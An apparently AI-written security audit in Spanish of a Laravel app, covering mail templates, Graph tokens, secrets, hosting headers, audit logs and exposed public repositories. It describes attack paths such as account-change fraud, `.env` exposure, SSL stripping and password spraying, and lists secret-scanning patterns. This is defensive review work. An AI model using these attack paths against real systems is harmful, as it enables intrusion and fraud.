- **Corrección:** lista de dominios permitidos en `config('cobro.copy_domains')` (`segurex.com`, `derivadoscol.com`), validada en `UpdateCopiesRequest` y otra vez en `SendRunItem` antes de enviar; aviso a TI o a la gerencia cuando cambien las copias.

### S-08 · Media · Las plantillas editables salen solas, sin aprobación

- **Dónde:** `app/Modules/Cobro/Http/Requests/UpdateTemplateRequest.php:33-35` (solo longitud y variables).
- **Cómo se explotaría:** con el mismo permiso `cobro.manage`, alguien cambia el texto por «Nueva cuenta para pagos: Bancolombia 123…» o un enlace falso. El envío programado lo manda desde `segurex.info@segurex.com` a todos los clientes con saldo vencido: un fraude de cambio de cuenta (BEC) con el remitente real de la empresa. No hay inyección de HTML, pero Outlook convierte las URL en enlaces.
- **Corrección:** que una persona distinta apruebe la plantilla antes de usarla en un envío programado, aviso con las diferencias a gerencia o TI y, opcional, señalar URL y números de cuenta en el texto.
- **Estado: corregido** en el PR 11b de la Fase 2.
  - Por decisión del usuario, en vez de la aprobación de una segunda persona, cada cambio efectivo de la plantilla (guardar con otros textos o volver a los por defecto si eran distintos) envía un aviso con las diferencias a `CORE_AUDIT_ALERT_RECIPIENTS`, desde el buzón de la empresa de la plantilla.
  - El aviso dice quién y cuándo cambió la plantilla, con un enlace a ella, y muestra cada texto cambiado línea por línea, con las quitadas y las agregadas marcadas. Todo va escapado, así que un enlace o un número de cuenta se ven tal como se escribieron.
  - Si no hay destinatarios o Graph no acepta el aviso, queda en el log y la plantilla se guarda igual. No se señalan aparte las URL ni los números de cuenta.

### S-22 · Baja · `GraphClient` manda el token a cualquier URL https

- **Dónde:** `app/Modules/Cobro/Infrastructure/Graph/GraphClient.php:180`. Las URL de paginación salen del cursor guardado en la base (`MailboxSync.php:64,84,91`).
- **Cómo se explotaría:** quien pueda escribir en la tabla de cursores (otra falla, acceso a la base) cambia la URL y recibe el token de Graph, con el que lee y envía desde los buzones.
- **Corrección:** aceptar solo URL que empiecen por `https://graph.microsoft.com/v1.0/`.

### S-23 · Baja · El token de Graph y la sesión se guardan sin cifrar

- **Dónde:** `GraphClient.php:173` (`Cache::put` con `CACHE_STORE=database`) y `config/session.php:50` (`SESSION_ENCRYPT=false`).
- **Cómo se explotaría:** un respaldo o un acceso de solo lectura a la base da un token válido por casi una hora para usar los buzones.
- **Corrección:** `Crypt::encryptString()` sobre el token y `SESSION_ENCRYPT=true`.

### S-24 · Baja · Un cliente puede falsificar un rebote

- **Dónde:** `app/Modules/Cobro/Domain/Mail/BounceDetector.php:49-50` decide solo por remitente o asunto; `InboundLinker.php:28-56` une por conversación, Message-ID citado o remitente.
- **Cómo se explotaría:** un cliente responde con el asunto «Undeliverable: …» y su envío queda marcado como rebotado en el informe y en la bitácora. Solo afecta la exactitud de los informes; todo se muestra escapado.
- **Corrección:** exigir además un remitente de sistema y una estructura DSN (`multipart/report`).
- **Estado: corregido** en la Fase 2.
  - Un mensaje solo es rebote si Exchange le dio la clase `REPORT.*.NDR` y, además, es un informe de nuestro Exchange (`X-MS-Exchange-Organization-AuthAs: Internal`, remitente `postmaster` o `MicrosoftExchange…` de un dominio propio) o el informe de otro servidor que cita el `Message-ID` de un envío. Un asunto «Undeliverable:» de un cliente queda como respuesta.
  - Riesgo que queda: un cliente con su propio servidor de correo puede armar un informe DSN real sobre el envío que recibió. Por decisión del usuario, los rebotes en texto plano sin estructura DSN ya no se detectan y quedan como respuestas.
  - Si Graph rechaza el `$expand` de la clase (HTTP 400 o 501) en la primera página de una vuelta, la sincronización la pide una vez sin él y deja un `warning`; mientras dure, los rebotes quedan como respuestas. `cobro:diagnosticar-rebote --probar-delta` muestra el rechazo.
  - `COBRO_TENANT_DOMAINS` (por ejemplo `gruporyr.onmicrosoft.com`) suma el dominio del inquilino a los propios, solo para el remitente de un informe de nuestro Exchange.
  - Pendiente: correr `cobro:diagnosticar-rebote` contra un rebote real de cada buzón para confirmar la clase, el encabezado y el remitente que entrega Exchange.

---

## 5. Secretos

### Lo que revisé

- **Historial completo:** 438 commits de todas las ramas (`git log -p --all`, sin lockfiles). `gitleaks` no está instalado en el equipo; usé patrones equivalentes: llaves privadas, AWS, GitHub, Slack, secretos de cliente de Entra ID (`…Q~…`), JWT, Supabase, `APP_KEY=base64:`, cadenas de conexión con contraseña y asignaciones `password|secret|token|key = valor`.
- **Resultado:** ningún secreto real. Las coincidencias son valores de prueba (`token-de-lectura-de-prueba`, `recorded-fixture-secret`, `k2026a-secreto-de-prueba`) o direcciones IP de ejemplo en pruebas (`10.0.0.x`).
- **Archivos:** nunca se versionó un `.env`, `config.php` ni `onedrive-config.php` de la Fase 1; solo `.env.example` y `etl/.env.example`.
- **`APP_DEBUG`:** `config/app.php:42` lo deja en `false` por defecto y `APP_ENV` en `production` (`:29`). Las páginas de error son genéricas.

**Limitación:** los permisos del agente bloquean leer `.env.example` y `etl/.env.example`, y no los evadí. El escaneo del historial sí cubrió su contenido con los patrones de arriba, pero conviene que el usuario abra `.env.example` y confirme que `APP_DEBUG=false`, `SESSION_SECURE_COOKIE=true` y `LOG_LEVEL` quedan bien para producción.

### S-31 · Baja · Datos internos en archivos del repositorio privado

- **Dónde:** `etl/.env.example` trae como valor de ejemplo la IP pública real de la puerta de la VPN Sophos (desde el primer commit, `b503a39`). Los correos reales de empleados aparecen como valores por defecto en `app/Modules/Cobro/config/cobro.php`, `app/Modules/Comisiones/Application/DefaultParameters.php` y sus pruebas, y en `legacy/portal-asesores/supabase/03_seed_usuarios.sql` y `05_seed_asesores.sql`.
- **Cómo se explotaría:** el repositorio es privado, así que solo importa si se filtra o se vuelve público. La IP sirve para atacar la VPN que da acceso a SAP.
- **Corrección:** dejar `SOPHOS_CONNECTION=` vacío en el ejemplo; mover los correos por defecto a `.env` o a la base; no subir `legacy/` al servidor.

---

## 6. Dependencias

| Comando | Resultado |
|---|---|
| `composer audit --locked` | «No security vulnerability advisories found.» No informó paquetes abandonados. |
| `npm audit` | `found 0 vulnerabilities`. |

- Las dependencias de desarrollo están en `require-dev` y el despliegue usa `--no-dev` (`deploy/deploy.sh:66`).
- `composer.json` tiene `minimum-stability: dev` con `prefer-stable: true`: conviene `stable` para que no entre una versión de desarrollo por accidente (baja, sin id).
- dompdf trae `enable_remote => false`.
- El robot en Python (`etl/requirements.txt`) no se auditó: `pip-audit` no está instalado. Queda como pendiente.

---

## 7. Configuración para GoDaddy

En local, `php artisan serve` no aplica `public/.htaccess`, así que estas cabeceras salen de leer el código; hay que probarlas en el hosting. En la respuesta de PHP no salió ninguna cabecera de seguridad, y sí `X-Powered-By: PHP/8.3.35`.

### S-01 · Alta · No se fuerza HTTPS y no hay HSTS

- **Dónde:** `public/.htaccess:1-25` no redirige a HTTPS; `bootstrap/app.php:14-18` y `app/Providers/AppServiceProvider.php` no fuerzan el esquema. No existe `Strict-Transport-Security` en el repositorio.
- **Cómo se explotaría:** quien abre `http://dominio` en un Wi-Fi público recibe la app en claro. Un atacante en esa red hace *SSL stripping*, roba la cookie (S-02) o desvía el flujo OAuth.
- **Corrección:** en `public/.htaccess`, antes de «Redirect Trailing Slashes»:

  ```apache
  RewriteCond %{HTTPS} !=on
  RewriteCond %{HTTP:X-Forwarded-Proto} !=https
  RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
  ```

  y `Header always set Strict-Transport-Security "max-age=31536000" env=HTTPS` (empezar con `max-age=300`). cPanel también ofrece «Force HTTPS Redirect».

### S-03 · Alta · Sin salvaguarda si el Document Root apunta a la raíz

- **Dónde:** no hay `.htaccess` ni `index.php` en la raíz del repositorio. Allí viven, en el servidor, `.env`, `.git/`, `storage/logs`, `legacy/` (con PHP ejecutable y semillas SQL) y `etl/`.
- **Cómo se explotaría:** si en cPanel el dominio queda apuntando a `<app>/` en vez de `<app>/public` (§16 de la arquitectura lo pide, pero es un paso manual), `GET /.env` entrega `APP_KEY`, los secretos de Entra ID y Graph, las llaves HMAC y la contraseña de MySQL. Con `APP_KEY` se falsifican cookies y URL firmadas (S-27).
- **Corrección:** un `.htaccess` en la raíz que rechace toda petición con `RewriteEngine On` y `RewriteRule ^ - [F]`. Las reglas de reescritura no se heredan: el `RewriteEngine On` de `public/.htaccess` las reemplaza, así que la app sigue igual cuando el Document Root es correcto. Con `Require all denied` sí habría herencia, y `public/` necesitaría su propio `Require all granted`. Hay que probarlo en el hosting. Además, no dejar `legacy/` ni `etl/.env` en el servidor.

### S-06 · Media · No hay cabeceras de seguridad

- **Dónde:** ningún middleware ni `.htaccess` define CSP, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy` ni `Permissions-Policy` (`public/.htaccess:49-57` solo fija `Cache-Control`).
- **Cómo se explotaría:** *clickjacking* de acciones como aprobar una liquidación desde una página del mismo sitio (otro subdominio de la empresa; `SameSite=Lax` ya lo frena desde sitios ajenos), *MIME sniffing*, fuga de URL con ids en el `Referer` y ninguna contención si apareciera un XSS.
- **Corrección, en dos partes:**
  1. En `public/.htaccess`, para todo lo estático:

     ```apache
     <IfModule mod_headers.c>
         Header always set X-Content-Type-Options "nosniff"
         Header always set X-Frame-Options "DENY"
         Header always set Referrer-Policy "strict-origin-when-cross-origin"
         Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()"
         Header always unset X-Powered-By
     </IfModule>
     ```

  2. Una CSP con nonce desde un middleware global de Core (`Vite::useCspNonce()`), solo fuera de `local`: `default-src 'self'; script-src 'self' 'nonce-…' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'`.
     - `'unsafe-eval'` es obligatorio mientras se use Alpine estándar (`resources/js/app.js:5` importa `alpinejs`, no `@alpinejs/csp`). Quitarlo exige pasar los componentes a `Alpine.data()`.
     - `style-src` necesita `'unsafe-inline'` sin nonce: hay un `<style>` en `resources/views/components/layouts/partials/head.blade.php:29` (variables `--brand-*`) y atributos `style=` en unas diez vistas.
     - `public/offline.html` tiene `<script>` en línea; con CSP por `.htaccess` hay que moverlo a un `.js` o permitirlo por hash.

### S-26 · Baja · `Options -Indexes` solo aplica si existe `mod_negotiation`

- **Dónde:** `public/.htaccess:2-4`.
- **Cómo se explotaría:** sin ese módulo, `/build/` o `/icons/` listarían su contenido. Hoy son estáticos sin datos.
- **Corrección:** `Options -Indexes` en la primera línea, fuera de todo `IfModule`.

### S-27 · Baja · El disco privado se sirve por `/storage/{path}`

- **Dónde:** `config/filesystems.php:36` (`'serve' => true`) registra `GET` y `PUT /storage/{path}` sobre `storage/app/private`, donde están los soportes de Comisiones y los Excel de la carga manual. Solo los protege una firma derivada de `APP_KEY` (en local, `/storage/logs/laravel.log` respondió 403). Ningún código usa `temporaryUrl()`.
- **Cómo se explotaría:** con `APP_KEY` filtrada (S-03), se firman URL y se descargan o suben archivos privados sin sesión.
- **Corrección:** `'serve' => false`, y quitar `storage:link` de `deploy.sh` si no se usa el disco `public`.

### S-28 · Baja · Proxies y hosts de confianza sin configurar (por confirmar)

- **Dónde:** `bootstrap/app.php:14-18`.
- **Cómo se explotaría:** si GoDaddy pone un proxy o WAF delante, `request()->ip()` sería la del proxy: la auditoría guardaría una IP inútil y todos compartirían el cupo de los limitadores, así que un atacante podría dejar sin servicio al robot y a Tesorería.
- **Corrección:** mirar `REMOTE_ADDR` y `X-Forwarded-For` en el servidor; si hay proxy, `trustProxies(at: [<ip del proxy>])` (nunca `'*'`) y `trustHosts()`.

### S-30 · Baja · `deploy.sh` no comprueba la configuración sensible

- **Dónde:** `deploy/deploy.sh:42-88`.
- **Cómo se explotaría:** un `.env` con `APP_ENV=local` o `APP_DEBUG=true` llega a producción sin aviso (S-11); `.env` puede quedar legible por otras cuentas.
- **Corrección:** antes de migrar, `chmod 600 .env` y abortar si `php artisan env` no es `production`, si `APP_DEBUG` no es `false` o si `SESSION_SECURE_COOKIE` no es `true`.

### Controles verificados

- `public/` solo tiene estáticos; no hay *source maps* y `robots.txt` responde `Disallow: /`.
- El service worker solo guarda `/build`, `/icons`, `/fonts` y `offline.html`, nunca datos de cartera (`public/sw.js:51-74`).
- Las fuentes van empaquetadas; no hay recursos externos en las vistas de la app.
- `DB::prohibitDestructiveCommands()` en producción (`AppServiceProvider.php:38`).
- `php artisan down` sin `--secret`: no hay URL para saltarse el mantenimiento.

---

## 8. Registro y datos personales (Ley 1581)

### Controles verificados

- `AuditLogger` guarda actor, IP, navegador (truncado) y hora, valida el nombre de la acción y redacta las llaves `password|secret|token` (`app/Modules/Core/Infrastructure/DatabaseAuditLogger.php:27-32,58-69`).
- Quedan auditados: los rechazos de ingreso (tenant, usuario borrado, identidad distinta, inactivo), el usuario nuevo, la salida, los cambios de usuarios y roles, las acciones de liquidación, los correos de aprobación, las exportaciones de Cartera y Asesores, los informes de Comisiones, la carga manual y los cambios de plantillas, copias y exclusiones de Cobro.

### S-13 · Media · Faltan eventos en la auditoría

- **Dónde y qué falta:**
  - Fallos de OAuth: solo `report()` (`MicrosoftCallbackController.php:34`), sin IP ni entrada en `audit_logs`.
  - Cambio de empresa: `SwitchCompanyController.php:18`.
  - Lotes de cobro y circularización: no queda una entrada con quién los lanzó, a cuántos clientes y con qué plantilla (`Cobro/Console/StartRunCommand.php`, `Infrastructure/Runs/SendRunItem.php`).
  - Lectura de respuestas de clientes (`ReplyInboxController`): datos personales de terceros sin rastro de quién los leyó.
  - Lotes del robot: solo `Log::info` (`ReceiveBatchController.php:61`).
  - Migración de datos: `MigrateActivitiesCommand` y `MigrateCommitmentsCommand` no auditan.
  - Token inválido en la API de Tesorería: no deja rastro (`VerifyTreasuryToken.php:38-40`).
- **Cómo se explotaría:** ante un incidente (S-07, S-08, una cuenta robada) no hay forma de reconstruir qué pasó, y la Ley 1581 pide poder demostrar quién accedió a los datos.
- **Corrección:** auditar `core.auth.failed`, `core.company.switched`, `cobro.run.started` y `cobro.run.finished`, `cobro.reply.viewed`, `ingesta.batch.accepted`, `core.migration.completed` y `bancos.api.refused`.
- **Estado de la API de Tesorería: corregido** en el PR 9b de la Fase 2.
  - Cada rechazo de `VerifyTreasuryToken` queda como `bancos.api.refused` con el ajuste (`api_token` o `ingest_token`), el motivo (`not_configured`, `too_short`, `missing` o `mismatch`) y la ruta; la auditoría agrega IP y agente. Nunca guarda el token ni su hash.
  - El límite `bancos-api` (60 por minuto por IP) corre antes y acota cuántos rechazos se auditan.

### S-14 · Media · La auditoría es inmutable solo en el modelo

- **Dónde:** `app/Modules/Core/Infrastructure/Persistence/AuditLogRecord.php:61-72` bloquea `update` y `delete` del modelo, pero `DB::table('audit_logs')` pasa sin control. La migración `2026_10_01_000003_create_audit_logs_table.php:26` define la llave foránea con `nullOnDelete()`, así que borrar un usuario **cambia** filas de la auditoría. `comisiones_bitacora` tiene la misma protección.
- **Cómo se explotaría:** con acceso a phpMyAdmin de cPanel o por otra falla, alguien borra o altera entradas sin dejar evidencia.
- **Corrección:** triggers de MySQL que rechacen `UPDATE` y `DELETE` (por confirmar que GoDaddy da el privilegio `TRIGGER`); si no, encadenar hashes y verificarlos con una tarea programada. Cambiar la llave foránea a `restrictOnDelete()` (los usuarios usan borrado lógico).
- **Estado: corregido** en la Fase 2.
  - PR 10a, corregido: la llave foránea de `user_id` es `restrictOnDelete()` en `audit_logs` y en `comisiones_bitacora` (migraciones `2026_10_01_000012` y `2026_10_08_000009`), así que borrar un usuario ya no cambia la auditoría y el borrado definitivo de un usuario con entradas falla. `AuditRecord` de Comisiones bloquea ahora `saveQuietly()`, `deleteQuietly()`, `forceDelete()` y `withoutEvents()`, igual que `AuditLogRecord`.
  - PR 10b, corregido: cada fila de `audit_logs` lleva en `chain_hash` un HMAC-SHA256 del hash anterior y de su contenido, con una llave derivada de `APP_KEY` (acepta `APP_PREVIOUS_KEYS`), y la tabla `audit_chain_head` guarda el último eslabón; `DatabaseAuditLogger` la bloquea y la mueve en la misma transacción que inserta la fila (migración `2026_10_01_000013`, que también sella las filas que ya existían). `core:verificar-auditoria` recalcula la cadena cada día a las 02:30 y la compara con la cabeza y con un punto de control fuera de la base (`storage/app/private/auditoria/cadena.json`). Si falla, deja un `critical` en el log y avisa por correo a `CORE_AUDIT_ALERT_RECIPIENTS`, solo con ids y el motivo. Se eligió en vez de triggers de MySQL: el hosting compartido de GoDaddy puede no dar los privilegios `TRIGGER` o `SUPER`, y un trigger no impide insertar entradas falsas ni un `DROP TRIGGER`. La cadena detecta, no impide, los cambios por la base; quien tenga `APP_KEY` sí podría rehacerla. Como cada evento de `comisiones_bitacora` también va a `audit_logs`, la cadena cubre las dos.

### S-29 · Baja · Datos personales en los logs y retención sin definir

- **Dónde:**
  - `config/logging.php:64,71`: `LOG_LEVEL` es `debug` por defecto.
  - `app/Modules/Cobro/Infrastructure/Runs/MarkItemBounced.php:41-44` escribe en el log el correo rebotado del cliente.
  - Las `QueryException` reportadas incluyen el SQL con sus valores (nombres, NIT, correos).
  - `failed_jobs` guarda 30 días los cuerpos con correos y HTML (`routes/console.php`).
  - No hay retención definida para `audit_logs`, los mensajes de buzón de Cobro ni `sessions`.
  - `comisiones_bitacora` no redacta secretos como sí lo hace Core (`Comisiones/Infrastructure/Audit/AuditTrail.php:58-69`).
  - Core no tiene pantalla para consultar `audit_logs`: solo se ve por base de datos.
- **Corrección:** `LOG_LEVEL=warning` en producción; `zend.exception_ignore_args=On` en el PHP del hosting; enmascarar el correo en `MarkItemBounced`; plazos de retención escritos (los define el área legal) con `model:prune`; definir quién consulta la auditoría y registrar esa consulta.
- **Estado: corregido en parte** en el PR 14 de la Fase 2.
  - Sin `LOG_LEVEL`, producción registra desde `info` (no `warning`, para no perder avisos de operación como el lote aceptado de Ingesta) y los demás entornos desde `debug`; el canal `slack` sigue en `critical`. Si el `.env` define `LOG_LEVEL`, manda ese valor: TI debe revisar que en producción no diga `debug`.
  - `MarkItemBounced` deja en el log solo el dominio de la copia que rebotó (`CopyRecipients::domain`), como `cobro.copies.dropped`.
  - `comisiones_bitacora` oculta las claves que contienen `password`, `secret` o `token`, sin distinguir mayúsculas y en los arreglos anidados, con la misma regla de Core.
  - Quedan fuera del código: `zend.exception_ignore_args=On` en el PHP del hosting (TI), los plazos de retención de logs, auditoría, mensajes de buzón y sesiones (área legal) y definir quién consulta la auditoría.

---

## 9. Repositorios públicos

Los cloné en modo espejo (sin ejecutar nada) y revisé todo su historial con los mismos patrones de la sección 5. El día de la revisión los dos eran **públicos** en GitHub, y sus commits llevan como autor `Claude@SEGUREX.LOCAL`, el nombre del dominio interno de Windows.

**Estado el 26 de octubre de 2026:** el usuario borró `SGX-Visualizador-Cartera` y volvió privado `SGX-Toma-De-Pedidos---SAP`. Lo comprobé: GitHub ya no encuentra el primero, el segundo figura como privado y los dos responden 404 sin sesión. Lo que estuvo publicado pudo quedar copiado en otros sitios, así que siguen pendientes los pasos de la VPN (S-04, punto 2) y de Entra ID (S-05).

### S-04 · Alta · `GrupoRyR/SGX-Visualizador-Cartera` (repositorio borrado)

3 commits, último push el 22 de septiembre de 2026. Es el portal de asesores en Next.js con el robot ETL anterior.

- **Qué expone:**
  - `etl/.env.example` trae como valor la **IP pública real de la puerta de la VPN Sophos** (`SOPHOS_CONNECTION`), el puerto de HANA (`30015`), la ruta de `sccli.exe` y el esquema `SEGUREX`. El README describe cuándo se conecta el robot (00:00 y 12:00) y cómo.
  - `supabase/03_seed_usuarios.sql` y `05_seed_asesores.sql`: nombres completos, correos corporativos y códigos de vendedor de SAP de unos 20 asesores y gerentes, con qué zona maneja cada uno.
  - `etl/queries/*.sql`: las consultas a SAP con nombres de tablas y campos.
  - La región del pooler de Supabase.
- **No expone:** contraseñas, llaves de Supabase, tokens ni datos de clientes (sin NIT, `CardCode` ni teléfonos).
- **Cómo se explotaría:** un atacante sabe exactamente dónde está la VPN que da acceso a SAP y tiene una lista de correos válidos de empleados con su cargo, ideal para *password spraying* contra la VPN y Microsoft 365 o para phishing dirigido. Publicar nombres y correos con su función sin autorización va contra el principio de finalidad de la Ley 1581.
- **Corrección:**
  1. Volver el repositorio **privado** (o archivarlo, porque este gestor lo reemplaza).
  2. Como la IP ya fue pública, revisar con TI los registros de la VPN Sophos, exigir MFA y bloqueo por intentos, y valorar cambiar la IP o restringir por país.
  3. Si debe seguir público, reescribir el historial para quitar esos archivos (`git filter-repo`) y rotar lo que haya pasado por él.

### S-05 · Media · `GrupoRyR/SGX-Toma-De-Pedidos---SAP` (ya es privado)

22 commits, último push el 7 de octubre de 2026. Es la web de pedidos en Laravel, publicada en `pedidos.segurex.com.co`.

- **Qué expone:**
  - `.env.produccion.example` y `README.md` (todavía en `HEAD`): el **tenant id y el client id reales** de la aplicación de Entra ID, la URL de producción y su callback.
  - Correos de unos 30 empleados en pruebas y semillas.
  - El diseño completo de la autenticación y del puente con SAP (`TokenDeServicio`, `PuenteSapController`).
- **No expone:** el secreto de cliente de Entra ID, contraseñas de MySQL ni tokens.
- **Cómo se explotaría:** el tenant y el client id no son secretos por sí solos, pero junto con la URL facilitan el phishing de consentimiento y el reconocimiento del tenant. Con el código público, un atacante busca fallas en la app de pedidos sin tocarla.
- **Corrección:** volverlo privado; si debe seguir público, quitar los ids reales de los ejemplos y confirmar en Entra ID que la aplicación solo acepta las URI de redirección propias y exige asignación de usuarios.

---

## 10. Plan de corrección (Fase 2)

PR pequeños, cada uno con una prueba que falle antes de corregir. Los que tocan archivos de la base, de Core o de otro módulo necesitan autorización con la lista exacta de archivos; la pido al empezar cada uno.

| Orden | PR | Hallazgos | Archivos (fuera de módulo = pedir autorización) |
|---|---|---|---|
| 1 | Servidor: HTTPS, HSTS, cabeceras y salvaguarda de la raíz | S-01, S-03, S-06 (estáticas), S-26 | `public/.htaccess`, `.htaccess` nuevo en la raíz, `tests/Feature/Server/HtaccessTest.php` y §16 de `docs/arquitectura.md` (todos de la base) |
| 2 | Sesión, almacenamiento, CORS y despliegue | S-02, S-21, S-23 (sesión), S-27, S-30 | `config/session.php`, `config/filesystems.php`, `config/cors.php` nuevo, `deploy/deploy.sh` (base) |
| 3 | Core: CSP, límites de ingreso y auditoría de acceso | S-06 (CSP), S-09, S-12, S-13 (Core), S-35 | `app/Modules/Core/**`, `tests/Modules/Core/**`; la CSP también toca el script en línea de `app/Modules/Cartera/resources/views/kanban/index.blade.php` y `public/offline.html` |
| 4 | Ingreso de demostración con bandera explícita | S-11 | `routes/web.php`, `app/Http/Controllers/Dev/**`, `database/seeders/**`, `config/app.php` (base) |
| 5 | Cobro: dominios de copias, aprobación de plantillas y Graph | S-07, S-08, S-22, S-23 (token), S-24 | `app/Modules/Cobro/**`, `tests/Modules/Cobro/**` |
| 6 | Ingesta: topes, llaves mínimas, nonce e historial por empresa | S-16, S-18, S-19, S-20, S-33, S-13 (lotes) | `app/Modules/Ingesta/**`, `tests/Modules/Ingesta/**` |
| 7 | Robot: STARTTLS y HANA cifrado | S-15, S-25, S-31 (ejemplo) | `etl/**` (Ingesta) |
| 8 | Comisiones: soportes, descargas, huella y PDF | S-32, S-34, S-36, S-38 | `app/Modules/Comisiones/**`, `tests/Modules/Comisiones/**`; el PDF de Asesores en su propio módulo |
| 9 | Bancos y exportaciones: tokens, mensajes, auditoría y límites | S-10, S-13 (Tesorería), S-18, S-37 | Cada módulo con exportaciones (Cartera, Asesores, Comisiones, Bancos) |
| 10 | Auditoría inmutable | S-14 | Migración nueva de Core; Comisiones para su bitácora |

Fuera del código, para el usuario o TI:

- Revisar los registros de la VPN Sophos, exigir MFA y bloqueo por intentos, y valorar cambiar su IP (S-04); revisar en Entra ID las URI de redirección y la asignación de usuarios de la app de pedidos (S-05). Los dos repositorios ya no son públicos.
- Confirmar en GoDaddy: Document Root en `public`, proxy delante o no, `TRIGGER` en MySQL y `zend.exception_ignore_args` (S-03, S-14, S-28, S-29).
- Confirmar en Exchange Online que la aplicación de Graph está limitada a los dos buzones (`Test-ServicePrincipalAuthorization`).
- Definir los plazos de retención de logs y auditoría con el área legal (S-29).
- Confirmar la IP fija del PC del robot, para valorar dejarla fuera del límite global de la API de ingesta (S-19).
- Decidir si la gerencia de cartera puede editar parámetros de una empresa que no tiene asignada (S-12) y si la asignación automática del rol `asesor` sigue (S-17).

## Cómo se hizo

- Lectura del código de los ocho módulos, la base, `etl/` y `deploy/`, en cuatro frentes en paralelo (acceso, entradas, API y correo, configuración y registro). Cada frente verificó sus citas leyendo el código, y en la revisión final volví a leer las de los hallazgos altos y medios y las de S-16, S-32, S-33 y S-34.
- Pruebas contra la app en `127.0.0.1` con los datos de demostración, sin red externa, sin SAP, sin VPN y sin bases reales.
- `composer audit`, `npm audit` y el escaneo de secretos de la sección 5.
- Copia espejo de los dos repositorios públicos, sin ejecutar su código.
- No se leyó ni se cambió ningún `.env`.
